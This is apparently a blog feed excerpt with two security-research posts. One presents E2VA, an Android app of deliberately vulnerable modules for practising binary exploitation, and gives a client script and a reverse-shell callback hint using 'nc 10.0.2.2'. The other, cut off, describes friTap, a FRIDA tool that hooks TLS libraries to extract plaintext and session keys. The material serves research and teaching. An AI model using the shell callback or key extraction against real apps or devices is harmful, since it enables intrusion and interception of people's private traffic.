&lt;p>In order to properly investigate binary exploitation on Android, an app has been written that allows for running custom vulnerable modules, i.e. Java classes with one entry point, in a separate process. It is remotely controllable and constructed in a way that allows to (re-)run a module multiple times even when it crashed.&lt;/p>
&lt;p>The app is named &lt;strong>E&lt;!-- raw HTML omitted -->2&lt;!-- raw HTML omitted -->VA&lt;/strong>, i.e. &lt;em>Exploitation Experience (with) Vulnerable App&lt;/em>. Within this blog series, &lt;em>E&lt;!-- raw HTML omitted -->2&lt;!-- raw HTML omitted -->VA&lt;/em> and &lt;em>damnvulnerableapp&lt;/em> will be used interchangably, so do not get confused!&lt;/p>
&lt;p>The core of the &lt;em>damnvulnerableapp&lt;/em> is a background service, called &lt;em>manager&lt;/em>, that handles communication with external users (only one at a time) and translates the messages received into actions to perform. Among other things, the most important actions are:&lt;/p>
&lt;ol>
&lt;li>Selecting a vulnerable module to be run in a &lt;strong>separate process&lt;/strong>. This has to be done, because it is &lt;strong>very&lt;/strong> likely that the vulnerable module will crash in case we mess up with an exploit.&lt;/li>
&lt;li>Exiting a vulnerable module. This will shutdown the process that hosts the vulnerable module and revert back to a selection state.&lt;/li>
&lt;li>Forwarding messages to the vulnerable module. It is possible to forward arbitrary binary data. Of course it is up to the module to accept this or not. E.g. if a vulnerable module internally calls &lt;code>strcpy&lt;/code>, sending arbitrary binary data will probably not do the trick.&lt;/li>
&lt;li>Fetching messages from the vulnerable module. When sending a fetch request, the &lt;em>manager&lt;/em> will try to read data from the vulnerable module. Depending on the configurations, this can time out or block forever.&lt;/li>
&lt;/ol>
&lt;p>Therefore, the usual steps are:&lt;/p>
&lt;ol>
&lt;li>Select a module&lt;/li>
&lt;li>Forward and fetch data until done, i.e. either until the process crashes or exits by itself or is instructed by an external user to terminate.&lt;/li>
&lt;li>Optionally, when trying to terminate the hosting process, &lt;em>manager&lt;/em> can be instructed to do so.&lt;/li>
&lt;/ol>
&lt;p>As regards selecting a module, the following diagram tries to illustrate this process:
&lt;img src="https://lolcads.github.io/2022/11/eva_0_request_example_2.svg" alt="Selecting a module">&lt;/p>
&lt;p>Notice that the &lt;em>Zygote&lt;/em> process is responsible for creating a new activity by forking. Therefore, the vulnerable process will contain e.g. the same canary as the manager app, which was also forked from &lt;em>Zygote&lt;/em>.&lt;/p>
&lt;p>In addition to selecting a module, the next diagram describes how data is fetched from a module and sent to an external user:
&lt;img src="https://lolcads.github.io/2022/11/eva_0_request_example_3.svg" alt="Forwarding message to a module">&lt;/p>
&lt;p>If a vulnerable module crashes, e.g. due to a failed exploitation attempt, then the &lt;em>manager&lt;/em> will detect this and revert back to the selection state. Therefore, one may select a new module immediately after the old module crashed. It is advised to &lt;strong>not&lt;/strong> flood &lt;em>manager&lt;/em> with commands as it takes time to spawn a process or detect that a process died. The latter heavily depends on the configurations and the module&amp;rsquo;s content.&lt;/p>
&lt;p>Also, the app requires specific privileges in order to avoid being rendered irresponsive after some time (often after 10s). To that end the app requests &lt;a href="https://developer.android.com/reference/android/provider/Settings#ACTION_MANAGE_OVERLAY_PERMISSION">&lt;code>ACTION_MANAGE_OVERLAY_PERMISSION&lt;/code>&lt;/a> (which is a runtime permission that can be dangerous, so please run the app on a device/emulator that does not contain personal information whatsoever, just in case &lt;em>damnvulnerableapp&lt;/em> gets hijacked by someone other than you). This permission seems to keep the &lt;em>manager&lt;/em> alive.&lt;/p>
&lt;h3 id="architecture">Architecture&lt;/h3>
&lt;p>&lt;em>damnvulnerableapp&lt;/em> is tested on an x86_64 Pixel 3 emulator that runs Android 12.0.0. The build number is &lt;a href="https://source.android.com/docs/setup/about/build-numbers#build-ids-defined">&lt;code>SE1A.220203.002.A1&lt;/code>&lt;/a>. Therefore, all exploits that involve shellcode will contain x86_64 assembly.&lt;/p>
&lt;h3 id="running-vulnerable-modules">Running Vulnerable Modules&lt;/h3>
&lt;p>Assuming there is a vulnerable module to be run, the &lt;em>manager&lt;/em> can be started from &lt;a href="https://developer.android.com/studio">&lt;em>Android Studio&lt;/em>&lt;/a> or via &lt;a href="https://developer.android.com/studio/command-line/adb">&lt;code>adb&lt;/code>&lt;/a>. Also &lt;em>damnvulnerableapp&lt;/em> should be launched in debug mode. Technically speaking, there is no need to start the app from &lt;em>Android Studio&lt;/em> other than being able to attach &lt;em>lldb&lt;/em> to the vulnerable module, as well as to adjust configurations to avoid timeouts etc. In order to get to more realistic binary exploitation, one should start with the &lt;code>.apk&lt;/code> file, start the app from console and go from there.&lt;/p>
&lt;p>Another thing to consider is that one should &lt;strong>not&lt;/strong> try to call e.g. &lt;code>execve&lt;/code> in the vulnerable process. This comes from the fact that e.g. &lt;code>execve&lt;/code> will &amp;ldquo;destroy&amp;rdquo; the actual vulnerable process, thus shutting down the connection to &lt;em>manager&lt;/em>. As &lt;em>manager&lt;/em> will assume the process to be dead, because the connection broke, it will attempt to fully kill remnants of the vulnerable process and then revert back to a select state. Thus, calling e.g. &lt;code>execve&lt;/code> dooms the vulnerabe process to be destroyed by &lt;em>manager&lt;/em>. One may think of this as an additional security mechanism, or just a reminder that stealthy exploits are cooler than loud one - shot exploits.&lt;/p>
&lt;h4 id="types-of-vulnerable-modules">Types of vulnerable modules&lt;/h4>
&lt;p>In order to allow for as many perspectives as possible for binary exploitation on Android, each vulnerable module encapsulates one of the following:&lt;/p>
&lt;ol>
&lt;li>a completely different vulnerability class than all the other modules. E.g. &lt;em>buffer - overflow&lt;/em> vs. &lt;em>use - after - free&lt;/em>.&lt;/li>
&lt;li>a slightly modified version of a fixed vulnerability class. E.g. a &lt;em>use - after - free&lt;/em> vulnerability can result in a &lt;em>Write - What - Where&lt;/em> condition or in an attacker being able to execute a chosen function, depending on the implementation.&lt;/li>
&lt;/ol>
&lt;p>Consider the composition of a vulnerable module:
&lt;img src="https://lolcads.github.io/2022/11/eva_0_composition.svg" alt="Composition of vulnerable modules">&lt;/p>
&lt;p>As can be seen in the above diagram, every (currently) module uses JNI functions to introduce vulnerabilities to be exploited. This is where binary exploitation becomes applicable to Java, namely due to native function calls.&lt;/p>
&lt;h4 id="communication-with-vulnerable-modules">Communication with vulnerable modules&lt;/h4>
&lt;p>&lt;em>damnvulnerableapp&lt;/em> will listen for incoming connections on port &lt;code>8080&lt;/code>. If it is run on an emulator, an external user may connect through &lt;code>nc 127.0.0.1 8080&lt;/code>. Before this is possible, one needs to run&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ adb forward tcp:8080 tcp:8080
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Otherwise, establishing a connection is refused. When trying to create a callback (or reverse shell etc.) in an emulator, i.e. establishing a connection from the emulator to the host, use &lt;code>nc 10.0.2.2 &amp;lt;port&amp;gt;&lt;/code>. According to &lt;a href="https://developer.android.com/studio/run/emulator-networking">docs&lt;/a>, &lt;code>10.0.2.2&lt;/code> is a &amp;ldquo;special alias to your host loopback interface&amp;rdquo;.&lt;/p>
&lt;p>The &lt;em>manager&lt;/em> will only react to messages from an external user, i.e. it uses a &lt;em>request - response&lt;/em> model to handle communication. Therefore, an external agent must not assume that it will be informed if the vulnerable module has a non - empty output queue. An external user always has to explicitly ask the &lt;em>manager&lt;/em> to fetch available output data.&lt;/p>
&lt;p>In order to ease communication with the &lt;em>damnvulnerableapp&lt;/em> and therefore the vulnerable modules, a client emerged that wraps the most important functionalities required to interact with the modules. The client is based on &lt;a href="https://docs.pwntools.com/en/stable/">&lt;code>pwntools&lt;/code>&lt;/a>, but can easily be translated to work with plain &lt;a href="https://docs.python.org/3/library/socket.html">&lt;code>sockets&lt;/code>&lt;/a> aswell.&lt;/p>
&lt;p>The following is the implementation of the &lt;code>pwntools&lt;/code> - based client (no guarantees for correctness and completeness):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> typing &lt;span style="color:#f92672">import&lt;/span> Tuple
TIMEOUT &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>
&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">PwnClient&lt;/span>:
&lt;span style="color:#66d9ef">def&lt;/span> __init__(self, host : str, port : int):
self&lt;span style="color:#f92672">.&lt;/span>io &lt;span style="color:#f92672">=&lt;/span> remote(host, port)
self&lt;span style="color:#f92672">.&lt;/span>handshake()
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">handshake&lt;/span>(self) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>:
self&lt;span style="color:#f92672">.&lt;/span>send(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;USER&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;INIT&amp;#39;&lt;/span>, capsule_type&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;INIT&amp;#39;&lt;/span>)
self&lt;span style="color:#f92672">.&lt;/span>receive()
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">close&lt;/span>(self) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>:
self&lt;span style="color:#f92672">.&lt;/span>send(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;SHUTDOWN&amp;#39;&lt;/span>)
self&lt;span style="color:#f92672">.&lt;/span>receive()
self&lt;span style="color:#f92672">.&lt;/span>send(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>, capsule_type&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;ACK&amp;#39;&lt;/span>)
self&lt;span style="color:#f92672">.&lt;/span>io&lt;span style="color:#f92672">.&lt;/span>close()
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">send&lt;/span>(self, message : bytes, operation, capsule_type&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;CONTENT&amp;#39;&lt;/span>) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>:
capsule &lt;span style="color:#f92672">=&lt;/span> capsule_type &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> operation &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39; CONTENT &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> message
length &lt;span style="color:#f92672">=&lt;/span> len(capsule)
self&lt;span style="color:#f92672">.&lt;/span>io&lt;span style="color:#f92672">.&lt;/span>send(p32(length, endian&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;big&amp;#39;&lt;/span>))
self&lt;span style="color:#f92672">.&lt;/span>io&lt;span style="color:#f92672">.&lt;/span>send(capsule)
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">block_receive&lt;/span>(self, num_bytes : int) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> bytes:
message &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#66d9ef">while&lt;/span> (len(message) &lt;span style="color:#f92672">&amp;lt;&lt;/span> num_bytes):
received &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>io&lt;span style="color:#f92672">.&lt;/span>recv(&lt;span style="color:#ae81ff">1&lt;/span>, timeout&lt;span style="color:#f92672">=&lt;/span>TIMEOUT)
&lt;span style="color:#66d9ef">if&lt;/span> (received &lt;span style="color:#f92672">and&lt;/span> len(received) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>):
message &lt;span style="color:#f92672">+=&lt;/span> received
&lt;span style="color:#66d9ef">return&lt;/span> message
&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;span style="color:#e6db74"> Returns:
&lt;/span>&lt;span style="color:#e6db74"> (length, capsule_type, operation, content)
&lt;/span>&lt;span style="color:#e6db74"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">receive&lt;/span>(self) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> Tuple[int, bytes, bytes, bytes]:
length &lt;span style="color:#f92672">=&lt;/span> u32(self&lt;span style="color:#f92672">.&lt;/span>block_receive(&lt;span style="color:#ae81ff">4&lt;/span>), endian&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;big&amp;#39;&lt;/span>)
message &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>block_receive(length)
split_message &lt;span style="color:#f92672">=&lt;/span> message&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>)
operation &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> (len(split_message) &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>):
operation &lt;span style="color:#f92672">=&lt;/span> split_message[&lt;span style="color:#ae81ff">1&lt;/span>]
content &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> (len(split_message) &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>):
content &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(split_message[&lt;span style="color:#ae81ff">3&lt;/span>:])
&lt;span style="color:#66d9ef">return&lt;/span> (length, split_message[&lt;span style="color:#ae81ff">0&lt;/span>], operation, content)
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">select&lt;/span>(self, module_name : str) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> str:
self&lt;span style="color:#f92672">.&lt;/span>send(module_name&lt;span style="color:#f92672">.&lt;/span>encode(&lt;span style="color:#e6db74">&amp;#39;utf-8&amp;#39;&lt;/span>), &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;SELECT&amp;#39;&lt;/span>)
&lt;span style="color:#66d9ef">return&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>receive()[&lt;span style="color:#ae81ff">3&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>decode()
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">forward&lt;/span>(self, message : bytes) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> str:
self&lt;span style="color:#f92672">.&lt;/span>send(message, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;FORWARD&amp;#39;&lt;/span>)
&lt;span style="color:#66d9ef">return&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>receive()[&lt;span style="color:#ae81ff">3&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>decode()
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">fetch&lt;/span>(self) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> bytes:
self&lt;span style="color:#f92672">.&lt;/span>send(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;FETCH&amp;#39;&lt;/span>)
&lt;span style="color:#66d9ef">return&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>receive()[&lt;span style="color:#ae81ff">3&lt;/span>]
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">exit&lt;/span>(self) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> str:
self&lt;span style="color:#f92672">.&lt;/span>send(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;EXIT&amp;#39;&lt;/span>)
res &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>receive()[&lt;span style="color:#ae81ff">3&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>decode()
self&lt;span style="color:#f92672">.&lt;/span>io&lt;span style="color:#f92672">.&lt;/span>close()
&lt;span style="color:#66d9ef">return&lt;/span> res
&lt;/code>&lt;/pre>&lt;/div>&lt;p>A sample program could look like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">...&lt;/span>
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
io &lt;span style="color:#f92672">=&lt;/span> PwnClient(&lt;span style="color:#e6db74">&amp;#39;127.0.0.1&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">8080&lt;/span>)
print(io&lt;span style="color:#f92672">.&lt;/span>fetch())
io&lt;span style="color:#f92672">.&lt;/span>forward(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;test123&amp;#39;&lt;/span>)
print(io&lt;span style="color:#f92672">.&lt;/span>fetch())
io&lt;span style="color:#f92672">.&lt;/span>exit()
&lt;span style="color:#66d9ef">if&lt;/span> (__name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;__main__&amp;#39;&lt;/span>):
main()
&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="summary">Summary&lt;/h1>
&lt;p>In this post, &lt;em>damnvulnerableapp&lt;/em> aka &lt;em>E&lt;!-- raw HTML omitted -->2&lt;!-- raw HTML omitted -->VA&lt;/em> was presented as an Android app that manages custom vulnerable modules that can be used for vulnerability research on Android OS&amp;rsquo;s. To that end, the modules try to cover different vulnerability classes to allow for discovery of Android - specific difficulities in binary exploitation.
In our next post we dive into the first vulnerability and how to exploit it. Stay tuned.&lt;/p>
&lt;h2 id="getting-started">Getting started&lt;/h2>
&lt;p>E&lt;!-- raw HTML omitted -->2&lt;!-- raw HTML omitted -->VA can be downloaded here: &lt;a href="https://github.com/fkie-cad/eeva">https://github.com/fkie-cad/eeva&lt;/a>&lt;/p></content></item><item><title>friTap - Decrypting TLS on the fly</title><link>https://lolcads.github.io/posts/2022/08/fritap/</link><pubDate>Fri, 12 Aug 2022 13:09:24 +0200</pubDate><guid>https://lolcads.github.io/posts/2022/08/fritap/</guid><description>Encryption - a curse and a blessing at the same time Digital communication in today&amp;rsquo;s world has a particularly high status in our society. Financial transactions are conducted via online banking, private communication is increasingly limited to digital messenger services, and even health data is experiencing a shift to digital form. Due to the growth of such sensitive digital data, the need for secure transmission of such data has become increasingly important over the past decades.</description><content>&lt;h2 id="encryption---a-curse-and-a-blessing-at-the-same-time">Encryption - a curse and a blessing at the same time&lt;/h2>
&lt;p>Digital communication in today&amp;rsquo;s world has a particularly high status in our society. Financial transactions are conducted via online banking, private communication is increasingly limited to digital messenger services, and even health data is experiencing a shift to digital form. Due to the growth of such sensitive digital data, the need for secure transmission of such data has become increasingly important over the past decades. With the introduction of high-performance and digitally secure cryptographic methods, such as SSL/TLS, today&amp;rsquo;s digital communications are predominantly encrypted. Whereas back then, for example, an attacker could hang himself between the client and the server and read the data traffic without encryption, today all he sees is a jumble of letters.
Encryption is truly a boon for protecting sensitive personal data, but it also has its drawbacks, as with almost everything. Encrypted communications negate the ability to analyze communications, which is very relevant when reverse engineering malware or researching vulnerabilities.&lt;/p>
&lt;h2 id="man-in-the-middle-proxy-as-a-solution">Man-in-the-middle proxy as a solution&lt;/h2>
&lt;p>One of the best known solutions to intercept and decrypt encrypted communications is the so-called &amp;ldquo;man-in-the-middle&amp;rdquo; attack. In this case, the attacker or analyst pretends to be a trustworthy communication partner to the client. However, since the client often does not know how the client&amp;rsquo;s communication partner, referred to hereafter as the server, communicates or behaves, the attacker (or analyst) forwards the communication to the server and pretends to be the client.
To establish encrypted communication via TLS, for example, a certificate is required, which the server sends to the client when the connection is established. So a connection is established between the MitM proxy and the client using a MitM certificate (fake certificate) and a connection is established between the MitM proxy and the server using a server certificate.
&lt;img src="https://lolcads.github.io/2022/08/mitm_proxy_without_cert_pinning.svg" alt="MitM">&lt;/p>
&lt;p>Due to this setup, the communication between client and server is routed through the MitM proxy and can be processed on it without encryption.&lt;/p>
&lt;p>There are some preventive measures that can prevent such an attack, especially on mobile devices. One of the best known measures is the so-called &amp;ldquo;certificate pinning&amp;rdquo;. This involves storing the expected server certificate or a hash of the certificate in the binary of the client itself. If the client subsequently receives a certificate from the alleged server, this is compared with the embedded certificate or verified by means of a hash value. If this verification is not successful, then the connection is aborted.&lt;/p>
&lt;p>A possible solution to this problem would be to modify the pinning code itself:&lt;/p>
&lt;p>&lt;img src="https://lolcads.github.io/2022/08/certpinning_hooking.svg" alt="Pinning">&lt;/p>
&lt;p>This approach is possible, but in many cases it is very time-consuming, since the implementations of the pinning can differ greatly depending on the version and the analysis of the code must be performed again for each new version if the pinning is not used from a well known library. In addition, there are, especially with malware, several different implementations of pinning, which is why a general approach often does not lead to the goal.&lt;/p>
&lt;h2 id="our-approach">Our approach:&lt;/h2>
&lt;p>One thing is certain: in order to get the unencrypted communication, the client application must be &amp;ldquo;attacked&amp;rdquo;. This led us to ask why we don&amp;rsquo;t directly extract the decrypted SSL/TLS stream or the key material from the target appliaction.&lt;/p>
&lt;h3 id="abstraction-of-using-a-library">Abstraction of using a library&lt;/h3>
&lt;p>Most applications that perform encrypted communication use a widely available library to do so, such as OpenSSL and NSS. These libraries try to keep the encryption of the data as abstract as possible, so that the use of the library is very convenient. Among other things, they encapsulate the TLS handshake and the sending and receiving of encrypted data.&lt;/p>
&lt;p>A common program flow utilizing a TLS library looks like this:&lt;/p>
&lt;p>The application wants to establish a secure TLS connection to a server. It uses the TLS library for this purpose, which performs the handshake as shown below:&lt;/p>
&lt;p>&lt;img src="https://lolcads.github.io/2022/08/connection.gif" alt="GIF here">&lt;/p>
&lt;p>After establishing the TLS connection, data can now be sent and received using the read and write functions of the TLS library as shown in the figure below.&lt;/p>
&lt;p>&lt;img src="https://lolcads.github.io/2022/08/fritap_approach.svg" alt="TLS hooking">&lt;/p>
&lt;p>Exactly these TLS-read and TLS-write functions are used by the target application to read and write the plaintext from TLS stream, respectively.
Hence our tool, &lt;a href="https://github.com/fkie-cad/friTap">friTap&lt;/a>, is hooking them in order to receive the plaintext of the encrypted packets. Beside this friTap is also able to extract the used TLS keys.&lt;/p>
&lt;p>&lt;img src="https://lolcads.github.io/2022/08/hooking_Fritap.svg" alt="friTap">&lt;/p>
&lt;h3 id="fritap-usage">friTap usage&lt;/h3>
&lt;p>&lt;a href="https://github.com/fkie-cad/friTap">friTap&lt;/a> comes with two operation modes. One is to get the plaintext from the TLS payload as PCAP and the other is to get the used TLS keys.
In order to get the decrypted TLS payload we need the &lt;code>-p&lt;/code> parameter:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ ./friTap.py –m –p decryptedTLS.pcap &amp;lt;target_app&amp;gt;
…
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> BoringSSL.so found &amp;amp; will be hooked on Android!
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Android dynamic loader hooked.
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Logging pcap to decryptedTLS.pcap
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The &lt;code>-m&lt;/code> paramter indicates that we are analysing a mobile application in the above example. For extracting the TLS keys from a target application we need the &lt;code>-k&lt;/code> parameter:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ ./friTap.py –m –k TLS_keys.log &amp;lt;target_app&amp;gt;
…
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> BoringSSL.so found &amp;amp; will be hooked on Android!
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Android dynamic loader hooked.
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Logging keylog file to TLS_keys.log
&lt;/code>&lt;/pre>&lt;/div>&lt;p>As a result friTap writes all TLS keys to the &lt;code>TLS_keys.log&lt;/code> file using the &lt;a href="https://firefox-source-docs.mozilla.org/security/nss/legacy/key_log_format/index.html">NSS Key Log Format&lt;/a>.&lt;/p>
&lt;h2 id="fritap-internals">friTap internals&lt;/h2>
&lt;p>After understanding the overall approach lets dive into the internals of &lt;a href="https://github.com/fkie-cad/friTap">friTap&lt;/a>.&lt;/p>
&lt;h3 id="frida">FRIDA&lt;/h3>
&lt;p>&lt;a href="https://github.com/fkie-cad/friTap">friTap&lt;/a> is built on the dynamic instrumentation toolkit &lt;a href="https://frida.re/">FRIDA&lt;/a>, which allows developers, reverse engineers and security researchers to dynamically analyze and instrument programs. FRIDA allows you to execute Javascript code within the target program, which gives you the ability to hook functions, read and write program memory, execute custom code, and more. A Python API is provided for using FRIDA, which makes it very user-friendly.&lt;/p>
&lt;p>To accomplish this, FRIDA injects the &lt;a href="https://bellard.org/quickjs/">QuickJS Javascript engine&lt;/a> (can also be changed to the &lt;a href="https://v8.dev/">V8 runtime&lt;/a>) into the target process and an agent that acts as communication interfaces between the instrumentarized process and its own tool later on.
After injection of the engine and the agent, the user is able to execute own Javascript code inside the target process and receive data from it. More on the inner workings of FRIDA can be found &lt;a href="https://frida.re/docs/presentations/">here&lt;/a>.&lt;/p>
&lt;h3 id="program-flow">Program flow&lt;/h3>
&lt;p>A rough overview of the flow of friTap can be seen in the following diagrams, which are explained in more detail in the sections that follow.
The first step after loading the friTap JS script into the target process is to identify the operating system (os) of the target process:&lt;/p>
&lt;p>&lt;img src="https://lolcads.github.io/2022/08/fritap_choose_os_agent_final.svg" alt="">&lt;/p>
&lt;p>Then an os specific agent will be loaded. This agent enumerates all loaded libraries/modules from the target process. FRIDA provides a function for this purpose that returns for each loaded module its name, base address, size and path in the file system. Based on the name of the modules friTap can identify a SSL/TLS library. Depending on the version and operating system, the name of the loaded module can vary greatly. friTap tries to cover all potential module names of supported libraries as best as possible using expressive regex. The operating system-specific agent determines which libraries are supported and how its hooking is implemented:&lt;/p>
&lt;p>&lt;img src="https://lolcads.github.io/2022/08/fritap_hook.svg" alt="">&lt;/p>
&lt;p>When a supported library is detected, friTap tries to hook the &lt;code>SSL-read()&lt;/code>, &lt;code>SSL-write()&lt;/code> and &lt;code>SSL-keyexport()&lt;/code> functions of the respective library and all other functions required for this. Sometimes the target library doesn&amp;rsquo;t provide a key export function, in those cases friTap have to parse the heap in order to find the keys in the memory of the target process.&lt;/p>
&lt;p>Next we want to dive into the implementation details of the mentioned parts of friTap. As mentioned above friTap checks at first on which plattform our target process is running and invoke than its respective os specific agent:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">load_os_specific_agent&lt;/span>() {
&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isWindows&lt;/span>()){
&lt;span style="color:#a6e22e">load_windows_hooking_agent&lt;/span>()
}&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isAndroid&lt;/span>()){
&lt;span style="color:#a6e22e">load_android_hooking_agent&lt;/span>()
}&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isLinux&lt;/span>()){
&lt;span style="color:#a6e22e">load_linux_hooking_agent&lt;/span>()
